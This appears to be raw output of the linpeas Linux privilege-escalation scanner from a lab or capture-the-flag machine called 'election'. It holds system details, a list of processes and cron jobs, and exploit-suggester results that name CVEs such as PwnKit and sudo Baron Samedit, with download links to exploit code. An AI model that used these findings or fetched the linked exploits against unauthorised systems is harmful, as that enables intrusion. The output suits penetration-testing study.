▄▄▄▄▄▄▄▀▀▀▀▀▀\r▀▀▀▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▀▀\r▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀\r/---------------------------------------------------------------------------------\\\r| Do you like PEASS? | |---------------------------------------------------------------------------------| | Get the latest version : https://github.com/sponsors/carlospolop | | Follow on Twitter : @carlospolopm | | Respect on HTB : SirBroccoli | |---------------------------------------------------------------------------------| | Thank you! | \\---------------------------------------------------------------------------------/ linpeas-ng by carlospolop ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner\u0026#39;s permission. Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist\rLEGEND: RED/YELLOW: 95% a PE vector\rRED: You should take a look to it\rLightCyan: Users with console\rBlue: Users without console \u0026amp; mounted devs\rGreen: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) LightMagenta: Your username\rStarting linpeas. Caching Writable Folders...\r╔═══════════════════╗\r═══════════════════════════════╣ Basic information ╠═══════════════════════════════ ╚═══════════════════╝ OS: Linux version 5.4.0-120-generic (buildd@lcy02-amd64-037) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #136~18.04.1-Ubuntu SMP Fri Jun 10 18:00:44 UTC 2022\rUser \u0026amp; Groups: uid=1000(love) gid=1000(love) groups=1000(love),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)\rHostname: election\rWritable folder: /dev/shm\r[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)\r[+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h) [+] /bin/nc is available for network discovery \u0026amp; port scanning (linpeas can discover hosts and scan ports, learn more with -h) Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE\r╔════════════════════╗\r══════════════════════════════╣ System Information ╠══════════════════════════════ ╚════════════════════╝ ╔══════════╣ Operative system\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits Linux version 5.4.0-120-generic (buildd@lcy02-amd64-037) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #136~18.04.1-Ubuntu SMP Fri Jun 10 18:00:44 UTC 2022\rDistributor ID: Ubuntu\rDescription: Ubuntu 18.04.4 LTS\rRelease: 18.04\rCodename: bionic\r╔══════════╣ Sudo version\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version Sudo version 1.8.21p2 ╔══════════╣ PATH\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin ╔══════════╣ Date \u0026amp; uptime\rMon May 15 20:52:34 IST 2023 20:52:34 up 1:35, 1 user, load average: 1.63, 1.20, 1.07\r╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)\rdisk sda\rsda1\r╔══════════╣ Unmounted file-system?\r╚ Check if you can mount umounted devices UUID=41866612-9f0f-4db9-9228-3f8a5729800b / ext4 errors=remount-ro 0 1 /swapfile none swap sw 0 0\r╔══════════╣ Environment\r╚ Any private information inside environment variables? HISTFILESIZE=0 MAIL=/var/mail/love\rUSER=love\rSSH_CLIENT=192.168.45.238 36620 22\rLANGUAGE=en_IN:en\rSHLVL=1\rHOME=/home/love\rSSH_TTY=/dev/pts/0\rDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus\rLOGNAME=love\r_=./linpeas.sh\rXDG_SESSION_ID=6\rTERM=xterm-256color\rPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\rXDG_RUNTIME_DIR=/run/user/1000\rLANG=en_IN\rHISTSIZE=0\rSHELL=/bin/bash\rPWD=/home/love\rSSH_CONNECTION=192.168.45.238 36620 192.168.213.211 22\rXDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop\rHISTFILE=/dev/null\r╔══════════╣ Searching Signature verification failed in dmesg\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed dmesg Not Found ╔══════════╣ Executing Linux Exploit Suggester\r╚ https://github.com/mzet-/linux-exploit-suggester [+] [CVE-2021-4034] PwnKit Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt\rExposure: probable\rTags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro\rDownload URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main\r[+] [CVE-2021-3156] sudo Baron Samedit\rDetails: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt\rExposure: probable\rTags: mint=19,[ ubuntu=18|20 ], debian=10\rDownload URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main\r[+] [CVE-2021-3156] sudo Baron Samedit 2\rDetails: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt\rExposure: probable\rTags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10\rDownload URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main\r[+] [CVE-2020-9470] Wing FTP Server \u0026lt;= 6.2.5 LPE\rDetails: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.php\rExposure: probable\rTags: [ ubuntu=18 ]\rDownload URL: https://www.hooperlabs.xyz/disclosures/cve-2020-9470.sh\rComments: Requires an administrator to login via the web interface.\r[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)\rDetails: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/\rhttps://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/\rExposure: less probable\rTags: ubuntu=(22.04){kernel:5.15.0-27-generic}\rDownload URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c\rComments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)\r[+] [CVE-2022-2586] nft_object UAF\rDetails: https://www.openwall.com/lists/oss-security/2022/08/29/5\rExposure: less probable\rTags: ubuntu=(20.04){kernel:5.12.13}\rDownload URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1\rComments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)\r[+] [CVE-2021-22555] Netfilter heap out-of-bounds write\rDetails: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html\rExposure: less probable\rTags: ubuntu=20.04{kernel:5.8.0-*}\rDownload URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c\rext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c\rComments: ip_tables kernel module must be loaded\r[+] [CVE-2019-18634] sudo pwfeedback\rDetails: https://dylankatz.com/Analysis-of-CVE-2019-18634/\rExposure: less probable\rTags: mint=19\rDownload URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c\rComments: sudo configuration requires pwfeedback to be enabled.\r[+] [CVE-2019-12181] Serv-U FTP Server\rDetails: https://blog.vastart.dev/2019/06/cve-2019-12181-serv-u-exploit-writeup.html\rExposure: less probable\rTags: debian=9\rDownload URL: https://raw.githubusercontent.com/guywhataguy/CVE-2019-12181/master/servu-pe-cve-2019-12181.c\rext-url: https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-12181/SUroot\rComments: Modified version at \u0026#39;ext-url\u0026#39; uses bash exec technique, rather than compiling with gcc.\r[+] [CVE-2017-0358] ntfs-3g-modprobe\rDetails: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072\rExposure: less probable\rTags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}\rDownload URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip\rComments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.\r╔══════════╣ Executing Linux Exploit Suggester 2\r╚ https://github.com/jondonas/linux-exploit-suggester-2 ╔══════════╣ Protections\r═╣ AppArmor enabled? .............. /etc/apparmor /etc/apparmor.d ═╣ AppArmor profile? .............. unconfined\r═╣ is linuxONE? ................... s390x Not Found\r═╣ grsecurity present? ............ grsecurity Not Found ═╣ PaX bins present? .............. PaX Not Found ═╣ Execshield enabled? ............ Execshield Not Found ═╣ SELinux enabled? ............... sestatus Not Found ═╣ Seccomp enabled? ............... disabled ═╣ User namespace? ................ enabled\r═╣ Cgroup2 enabled? ............... enabled\r═╣ Is ASLR enabled? ............... Yes\r═╣ Printer? ....................... No\r═╣ Is this a virtual machine? ..... Yes (vmware) ╔═══════════╗\r═══════════════════════════════════╣ Container ╠═══════════════════════════════════ ╚═══════════╝ ╔══════════╣ Container related tools present (if any):\r╔══════════╣ Am I Containered? ╔══════════╣ Container details ═╣ Is this a container? ........... No ═╣ Any running containers? ........ No ╔═══════╗\r═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════ ╚═══════╝ ═╣ Google Cloud Platform? ............... No\r═╣ AWS ECS? ............................. No\r═╣ AWS EC2? ............................. No\r═╣ AWS EC2 Beanstalk? ................... No\r═╣ AWS Lambda? .......................... No\r═╣ DO Droplet? .......................... No\r═╣ IBM Cloud VM? ........................ No\r╔════════════════════════════════════════════════╗\r════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════ ╚════════════════════════════════════════════════╝ ╔══════════╣ Cleaned processes\r╚ Check weird \u0026amp; unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes root 1 0.0 0.8 159888 8040 ? Ss 19:16 0:01 /sbin/init splash root 276 0.0 1.2 111388 12800 ? S\u0026lt;s 19:16 0:00 /lib/systemd/systemd-journald\rroot 327 0.0 0.4 48724 4680 ? Ss 19:16 0:00 /lib/systemd/systemd-udevd\rroot 423 0.0 0.5 99444 5396 ? Ss 19:16 0:00 /usr/bin/VGAuthService\rsystemd+ 424 0.0 0.4 70764 4480 ? Ss 19:16 0:00 /lib/systemd/systemd-resolved\rroot 426 0.0 0.5 244228 5912 ? S\u0026lt;sl 19:16 0:03 /usr/bin/vmtoolsd\rroot 434 0.0 0.5 70720 5588 ? Ss 19:16 0:00 /lib/systemd/systemd-logind\rsyslog 435 0.0 0.3 269328 3092 ? Ssl 19:16 0:00 /usr/sbin/rsyslogd -n\rroot 436 0.0 0.3 110512 3048 ? Ssl 19:16 0:00 /usr/sbin/irqbalance --foreground\rmessage+ 438 0.0 0.4 51340 4524 ? Ss 19:16 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\r└─(Caps) 0x0000000020000000=cap_audit_write\rroot 552 0.0 0.6 502908 6184 ? Ssl 19:16 0:00 /usr/lib/udisks2/udisksd\rroot 553 0.0 0.5 177632 5804 ? Ssl 19:16 0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers\rroot 556 0.0 0.2 45232 2908 ? Ss 19:16 0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant\rroot 558 0.0 0.4 434324 4624 ? Ssl 19:16 0:00 /usr/sbin/ModemManager --filter-policy=strict\ravahi 620 0.0 0.0 47072 44 ? S 19:16 0:00 _ avahi-daemon: chroot helper\rroot 567 0.0 0.0 4548 728 ? Ss 19:16 0:00 /usr/sbin/acpid\rroot 570 0.0 0.3 38424 3088 ? Ss 19:16 0:00 /usr/sbin/cron -f\rroot 571 0.0 0.5 294744 5396 ? Ssl 19:16 0:00 /usr/lib/accountsservice/accounts-daemon[0m\rroot 631 0.0 0.6 292900 6960 ? Ssl 19:16 0:00 /usr/lib/policykit-1/polkitd --no-debug\rroot 672 0.0 0.6 194228 6632 ? Ssl 19:16 0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal\rroot 764 0.0 0.4 72296 4296 ? Ss 19:16 0:00 /usr/sbin/sshd -D\rlove 4009 0.0 0.5 110072 5640 ? S 20:45 0:00 _ sshd: love@pts/0\rlove 4011 0.0 0.4 29492 4904 pts/0 Ss 20:45 0:00 _ -bash\rlove 4106 0.0 0.3 5840 3176 pts/0 S+ 20:51 0:00 _ /bin/sh ./linpeas.sh\rlove 7493 0.0 0.1 5840 1424 pts/0 S+ 20:52 0:00 _ /bin/sh ./linpeas.sh\rlove 7497 0.0 0.3 44792 3768 pts/0 R+ 20:52 0:00 | _ ps fauxwww\rlove 7496 0.0 0.1 5840 1424 pts/0 S+ 20:52 0:00 _ /bin/sh ./linpeas.sh\rmysql 835 0.0 3.4 678784 34332 ? Ssl 19:16 0:04 /usr/sbin/mysqld\rroot 872 0.0 4.1 506688 41240 ? Ss 19:16 0:00 /usr/sbin/apache2 -k start\rwww-data 2456 0.0 3.3 522168 33188 ? S 19:22 0:01 _ /usr/sbin/apache2 -k start\rwww-data 2999 0.0 3.3 522240 33572 ? S 19:46 0:01 _ /usr/sbin/apache2 -k start\rwww-data 3011 0.0 3.1 521784 31016 ? S 19:46 0:01 _ /usr/sbin/apache2 -k start\rwww-data 3015 0.0 3.1 522152 31824 ? S 19:46 0:01 _ /usr/sbin/apache2 -k start\rwww-data 3039 0.0 3.1 521992 31116 ? S 19:48 0:01 _ /usr/sbin/apache2 -k start\rwww-data 3576 0.0 3.2 522160 32904 ? S 20:24 0:00 _ /usr/sbin/apache2 -k start\rwww-data 3684 0.0 2.3 509864 23928 ? S 20:33 0:00 _ /usr/sbin/apache2 -k start\rwww-data 3850 0.0 2.5 510452 25680 ? S 20:40 0:00 _ /usr/sbin/apache2 -k start\rwww-data 3867 0.0 2.3 509796 23760 ? S 20:42 0:00 _ /usr/sbin/apache2 -k start\rwww-data 4066 0.0 2.2 509252 22276 ? S 20:49 0:00 _ /usr/sbin/apache2 -k start\rroot 1495 0.0 0.1 134220 1504 ? S 19:17 0:00 VBoxClient --vmsvga\rroot 1516 0.0 0.6 308056 6096 ? Ssl 19:17 0:00 /usr/sbin/gdm3\rgdm 1543 0.0 0.4 212132 4756 tty1 Ssl+ 19:17 0:00 _ /usr/lib/gdm3/gdm-x-session gnome-session --autostart /usr/share/gdm/greeter/autostart\rgdm 1545 0.0 2.0 470308 20756 tty1 Sl+ 19:17 0:00 _ /usr/lib/xorg/Xorg vt1 -displayfd 3 -auth /run/user/121/gdm/Xauthority -background none -noreset -keeptty -verbose 3\rgdm 1554 0.0 0.8 558924 8696 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-session/gnome-session-binary --autostart /usr/share/gdm/greeter/autostart\rgdm 1584 0.0 13.1 3417108 131732 tty1 Sl+ 19:17 0:04 _ /usr/bin/gnome-shell\rgdm 1619 0.0 0.5 361464 5700 tty1 Sl 19:17 0:00 | _ ibus-daemon --xim --panel disable\rgdm 1622 0.0 0.3 280612 3840 tty1 Sl 19:17 0:00 | _ /usr/lib/ibus/ibus-dconf\rgdm 1744 0.0 0.4 204888 4576 tty1 Sl 19:17 0:00 | _ /usr/lib/ibus/ibus-engine-simple\rgdm 1649 0.0 1.1 494536 11480 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-xsettings\rgdm 1654 0.0 0.4 278124 4392 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-a11y-settings\rgdm 1656 0.0 1.0 343680 10836 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-clipboard\rgdm 1664 0.0 1.1 658880 11440 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-color\rgdm 1665 0.0 0.8 394880 8112 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-datetime\rgdm 1666 0.0 0.4 283736 4556 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-housekeeping\rgdm 1669 0.0 1.1 506568 11400 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-keyboard\rgdm 1670 0.0 1.2 792972 12196 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-media-keys\rgdm 1671 0.0 0.3 201996 3460 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-mouse\rgdm 1677 0.0 1.2 591084 12348 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-power\rgdm 1680 0.0 0.6 267020 6476 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-print-notifications\rgdm 1686 0.0 0.3 202016 3376 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-rfkill\rgdm 1689 0.0 0.3 275732 3424 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-screensaver-proxy\rgdm 1695 0.0 0.5 305216 5460 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-sharing\rgdm 1700 0.0 0.5 377896 5224 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-smartcard\rgdm 1705 0.0 0.5 332828 5528 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-sound\rgdm 1710 0.0 1.1 502284 11572 tty1 Sl+ 19:17 0:00 _ /usr/lib/gnome-settings-daemon/gsd-wacom\rgdm 1531 0.0 0.7 76924 7276 ? Ss 19:17 0:00 /lib/systemd/systemd --user\rgdm 1532 0.0 0.1 195960 1412 ? S 19:17 0:00 _ (sd-pam)\rgdm 1551 0.0 0.4 50264 4084 ? Ss 19:17 0:00 _ /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\rgdm 1558 0.0 0.4 349248 4148 ? Ssl 19:17 0:00 _ /usr/lib/at-spi2-core/at-spi-bus-launcher\rgdm 1563 0.0 0.3 49920 3736 ? S 19:17 0:00 | _ /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3\rgdm 1566 0.0 0.5 220780 5096 ? Sl 19:17 0:00 _ /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session\rgdm 1606 0.0 0.7 1245004 7756 ? Ssl 19:17 0:00 _ /usr/bin/pulseaudio --daemonize=no\rgdm 1629 0.0 0.4 278556 4064 ? Sl 19:17 0:00 _ /usr/lib/ibus/ibus-portal\rgdm 1637 0.0 0.3 271560 3836 ? Ssl 19:17 0:00 _ /usr/libexec/xdg-permission-store\rgdm 1820 0.0 0.3 187772 3988 ? Sl 19:17 0:00 _ /usr/lib/dconf/dconf-service\rroot 1591 0.0 0.6 322332 6100 ? Ssl 19:17 0:00 /usr/lib/upower/upowerd\rrtkit 1607 0.0 0.2 183504 2944 ? SNsl 19:17 0:00 /usr/lib/rtkit/rtkit-daemon\r└─(Caps) 0x0000000000800004=cap_dac_read_search,cap_sys_nice\rgdm 1625 0.0 1.0 344064 10804 tty1 Sl 19:17 0:00 /usr/lib/ibus/ibus-x11 --kill-daemon\rroot 1645 0.0 0.5 296872 5392 ? Ssl 19:17 0:00 /usr/lib/x86_64-linux-gnu/boltd\rroot 1650 0.0 0.8 374852 8032 ? Ssl 19:17 0:00 /usr/lib/packagekit/packagekitd\rcolord 1721 0.0 1.0 324976 10476 ? Ssl 19:17 0:00 /usr/lib/colord/colord\rwhoopsie 1760 0.0 0.8 390552 8984 ? Ssl 19:17 0:00 /usr/bin/whoopsie -f\rkernoops 1771 0.0 0.2 56940 2196 ? Ss 19:17 0:00 /usr/sbin/kerneloops --test\rkernoops 1773 0.0 0.0 56940 420 ? Ss 19:17 0:00 /usr/sbin/kerneloops\rroot 1798 0.1 1.0 607484 10224 ? Ssl 19:17 0:08 ./Serv-U -startservice\rroot 1838 0.0 0.0 4624 832 ? Ss 19:17 0:00 /bin/sh /usr/lib/apt/apt.systemd.daily update\rroot 1842 0.0 0.1 4624 1788 ? S 19:17 0:00 _ /bin/sh /usr/lib/apt/apt.systemd.daily lock_is_held update\rroot 1892 99.8 12.2 244016 122280 ? RN 19:18 94:28 _ /usr/bin/python3 /usr/bin/unattended-upgrade --download-only\rroot 2179 0.0 1.1 492000 11008 ? Ssl 19:19 0:00 /usr/sbin/NetworkManager --no-daemon[0m\rroot 2428 0.0 0.6 107700 6232 ? Ss 19:21 0:00 /usr/sbin/cupsd -l\rroot 2429 0.0 0.8 303668 8268 ? Ssl 19:21 0:00 /usr/sbin/cups-browsed\rlove 3905 0.0 0.7 76764 7628 ? Ss 20:45 0:00 /lib/systemd/systemd --user\rlove 3906 0.0 0.2 195960 2240 ? S 20:45 0:00 _ (sd-pam)\r╔══════════╣ Binary processes permissions (non \u0026#39;root root\u0026#39; and not belonging to current user)\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes ╔══════════╣ Processes whose PPID belongs to a different user (not root)\r╚ You will know if a user can somehow spawn processes as a different user Proc 424 with ppid 1 is run by user systemd-resolve but the ppid user is root Proc 435 with ppid 1 is run by user syslog but the ppid user is root\rProc 438 with ppid 1 is run by user messagebus but the ppid user is root\rProc 564 with ppid 1 is run by user avahi but the ppid user is root\rProc 835 with ppid 1 is run by user mysql but the ppid user is root\rProc 1531 with ppid 1 is run by user gdm but the ppid user is root\rProc 1543 with ppid 1522 is run by user gdm but the ppid user is root\rProc 1607 with ppid 1 is run by user rtkit but the ppid user is root\rProc 1625 with ppid 1 is run by user gdm but the ppid user is root\rProc 1721 with ppid 1 is run by user colord but the ppid user is root\rProc 1760 with ppid 1 is run by user whoopsie but the ppid user is root\rProc 1771 with ppid 1 is run by user kernoops but the ppid user is root\rProc 1773 with ppid 1 is run by user kernoops but the ppid user is root\rProc 2456 with ppid 872 is run by user www-data but the ppid user is root\rProc 2999 with ppid 872 is run by user www-data but the ppid user is root\rProc 3011 with ppid 872 is run by user www-data but the ppid user is root\rProc 3015 with ppid 872 is run by user www-data but the ppid user is root\rProc 3039 with ppid 872 is run by user www-data but the ppid user is root\rProc 3576 with ppid 872 is run by user www-data but the ppid user is root\rProc 3684 with ppid 872 is run by user www-data but the ppid user is root\rProc 3850 with ppid 872 is run by user www-data but the ppid user is root\rProc 3867 with ppid 872 is run by user www-data but the ppid user is root\rProc 3905 with ppid 1 is run by user love but the ppid user is root\rProc 4009 with ppid 3900 is run by user love but the ppid user is root\rProc 4066 with ppid 872 is run by user www-data but the ppid user is root\r╔══════════╣ Files opened by processes belonging to other users\r╚ This is usually empty because of the lack of privileges to read other user processes information COMMAND PID TID USER FD TYPE DEVICE SIZE/OFF NODE NAME ╔══════════╣ Processes with credentials in memory (root req)\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#credentials-from-process-memory gdm-password Not Found gnome-keyring-daemon Not Found lightdm Not Found vsftpd Not Found apache2 process found (dump creds from memory as root) sshd: process found (dump creds from memory as root)\r╔══════════╣ Cron jobs\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs /usr/bin/crontab incrontab Not Found\r-rw-r--r-- 1 root root 723 Apr 9 2020 /etc/crontab /etc/cron.d:\rtotal 32\rdrwxr-xr-x 2 root root 4096 Apr 2 2020 .\rdrwxr-xr-x 130 root root 12288 Jun 16 2022 ..\r-rw-r--r-- 1 root root 285 May 29 2017 anacron\r-rw-r--r-- 1 root root 712 Dec 17 2018 php\r-rw-r--r-- 1 root root 102 Nov 16 2017 .placeholder\r-rw-r--r-- 1 root root 191 Oct 20 2019 popularity-contest\r/etc/cron.daily:\rtotal 76\rdrwxr-xr-x 2 root root 4096 May 27 2020 .\rdrwxr-xr-x 130 root root 12288 Jun 16 2022 ..\r-rwxr-xr-x 1 root root 311 May 29 2017 0anacron\r-rwxr-xr-x 1 root root 539 Jul 16 2019 apache2\r-rwxr-xr-x 1 root root 376 Nov 20 2017 apport\r-rwxr-xr-x 1 root root 1478 Apr 20 2018 apt-compat\r-rwxr-xr-x 1 root root 355 Dec 29 2017 bsdmainutils\r-rwxr-xr-x 1 root root 384 Dec 13 2012 cracklib-runtime\r-rwxr-xr-x 1 root root 1176 Nov 3 2017 dpkg\r-rwxr-xr-x 1 root root 372 Aug 21 2017 logrotate\r-rwxr-xr-x 1 root root 1065 Apr 7 2018 man-db\r-rwxr-xr-x 1 root root 538 Mar 1 2018 mlocate\r-rwxr-xr-x 1 root root 249 Jan 25 2018 passwd\r-rw-r--r-- 1 root root 102 Nov 16 2017 .placeholder\r-rwxr-xr-x 1 root root 3477 Feb 21 2018 popularity-contest\r-rwxr-xr-x 1 root root 246 Mar 21 2018 ubuntu-advantage-tools\r-rwxr-xr-x 1 root root 214 Nov 12 2018 update-notifier-common\r/etc/cron.hourly:\rtotal 20\rdrwxr-xr-x 2 root root 4096 Aug 6 2019 .\rdrwxr-xr-x 130 root root 12288 Jun 16 2022 ..\r-rw-r--r-- 1 root root 102 Nov 16 2017 .placeholder\r/etc/cron.monthly:\rtotal 24\rdrwxr-xr-x 2 root root 4096 Aug 6 2019 .\rdrwxr-xr-x 130 root root 12288 Jun 16 2022 ..\r-rwxr-xr-x 1 root root 313 May 29 2017 0anacron\r-rw-r--r-- 1 root root 102 Nov 16 2017 .placeholder\r/etc/cron.weekly:\rtotal 32\rdrwxr-xr-x 2 root root 4096 Aug 6 2019 .\rdrwxr-xr-x 130 root root 12288 Jun 16 2022 ..\r-rwxr-xr-x 1 root root 312 May 29 2017 0anacron\r-rwxr-xr-x 1 root root 723 Apr 7 2018 man-db\r-rw-r--r-- 1 root root 102 Nov 16 2017 .placeholder\r-rwxr-xr-x 1 root root 211 Nov 12 2018 update-notifier-common\r/var/spool/anacron:\rtotal 20\rdrwxr-xr-x 2 www-data www-data 4096 Oct 20 2019 .\rdrwxr-xr-x 6 www-data www-data 4096 Oct 20 2019 ..\r-rw------- 1 root root 9 May 15 19:27 cron.daily\r-rw------- 1 root root 9 May 15 19:37 cron.monthly\r-rw------- 1 root root 9 May 15 19:32 cron.weekly\rSHELL=/bin/sh\rPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\r17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly\r25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily )\r47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly )\r52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly )\rSHELL=/bin/sh\rPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\rHOME=/root\rLOGNAME=root\r1 5 cron.daily run-parts --report /etc/cron.daily\r7 10 cron.weekly run-parts --report /etc/cron.weekly\r@monthly 15 cron.monthly run-parts --report /etc/cron.monthly\r╔══════════╣ Systemd PATH\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd-path-relative-paths PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ╔══════════╣ Analyzing .service files\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services /etc/systemd/system/multi-user.target.wants/mariadb.service could be executing some relative path /etc/systemd/system/multi-user.target.wants/networking.service could be executing some relative path\r/etc/systemd/system/mysqld.service could be executing some relative path\r/etc/systemd/system/mysql.service could be executing some relative path\r/etc/systemd/system/network-online.target.wants/networking.service could be executing some relative path\rYou can\u0026#39;t write on systemd PATH\r╔══════════╣ System timers\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers NEXT LEFT LAST PASSED UNIT ACTIVATES\rMon 2023-05-15 21:03:31 IST 10min left Mon 2023-05-15 20:00:07 IST 52min ago anacron.timer anacron.service\rMon 2023-05-15 21:09:00 IST 16min left Mon 2023-05-15 20:39:00 IST 13min ago phpsessionclean.timer phpsessionclean.service\rTue 2023-05-16 02:54:26 IST 6h left Mon 2023-05-15 19:19:28 IST 1h 33min ago motd-news.timer motd-news.service\rTue 2023-05-16 19:31:47 IST 22h left Mon 2023-05-15 19:31:47 IST 1h 20min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service\rMon 2023-05-22 00:00:00 IST 6 days left Mon 2023-05-15 19:19:28 IST 1h 33min ago fstrim.timer fstrim.service\rn/a n/a Sat 2023-02-18 04:12:09 IST 2 months 25 days ago apt-daily-upgrade.timer apt-daily-upgrade.service\rn/a n/a Sat 2023-02-18 04:12:09 IST 2 months 25 days ago apt-daily.timer apt-daily.service\rn/a n/a n/a n/a snapd.snap-repair.timer n/a n/a n/a n/a ureadahead-stop.timer ureadahead-stop.service\r╔══════════╣ Analyzing .timer files\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#timers /etc/systemd/system/snapd.snap-repair.timer ╔══════════╣ Analyzing .socket files\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sockets /etc/systemd/system/sockets.target.wants/avahi-daemon.socket is calling this writable listener: /run/avahi-daemon/socket\r/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request\r/lib/systemd/system/avahi-daemon.socket is calling this writable listener: /run/avahi-daemon/socket\r/lib/systemd/system/dbus.socket 